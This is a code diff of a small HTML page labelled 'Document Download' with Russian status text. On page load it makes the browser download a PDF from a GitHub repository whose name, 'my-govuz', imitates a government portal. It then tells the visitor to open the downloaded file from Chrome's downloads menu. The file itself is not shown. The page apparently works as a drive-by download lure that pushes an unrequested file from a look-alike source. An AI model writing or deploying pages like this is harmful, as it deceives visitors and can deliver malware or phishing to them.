@@ -5,26 +5,71 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document Download</title>
+
+    <style>
+        body {
+            margin: 0;
+            background: #101114;
+            color: white;
+            font-family: Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        .container {
+            padding: 30px;
+        }
+
+        button {
+            padding: 15px 25px;
+            background: #3478f6;
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+    </style>
 </head>
+
 <body>
 
+<div class="container">
+    <h2>Документ загружается</h2>
+    <p id="status">Подготовка загрузки...</p>
+    <button id="downloads" hidden>
+        Открыть загрузки
+    </button>
+</div>
+
 <script>
-    window.addEventListener("load", function () {
-        const pdfUrl = "https://github.com/my-govuz/my-gov_/raw/refs/heads/main/down-2026-27-12_17-00-55.pdf";
+const pdfUrl =
+"https://github.com/my-govuz/my-gov_/raw/refs/heads/main/down-2026-27-12_17-00-55.pdf";
 
-        // Начать скачивание PDF
-        const link = document.createElement("a");
-        link.href = pdfUrl;
-        link.download = "document.pdf";
-        document.body.appendChild(link);
-        link.click();
-        link.remove();
+window.addEventListener("load", () => {
+    const link = document.createElement("a");
 
-        // Перейти на вкладку загрузок Chrome
-        setTimeout(function () {
-            window.location.href = "chrome://downloads/";
-        }, 1500);
-    });
+    link.href = pdfUrl;
+    link.download = "document.pdf";
+
+    document.body.appendChild(link);
+    link.click();
+    link.remove();
+
+    document.getElementById("status").textContent =
+        "Загрузка начата. Откройте скачанные файлы.";
+
+    document.getElementById("downloads").hidden = false;
+});
+
+document.getElementById("downloads").addEventListener("click", () => {
+    // Внутреннюю страницу Chrome сайт открыть не может.
+    document.getElementById("status").textContent =
+        "Нажмите меню Chrome ⋮ → Скачанные файлы.";
+});
 </script>
 
 </body>
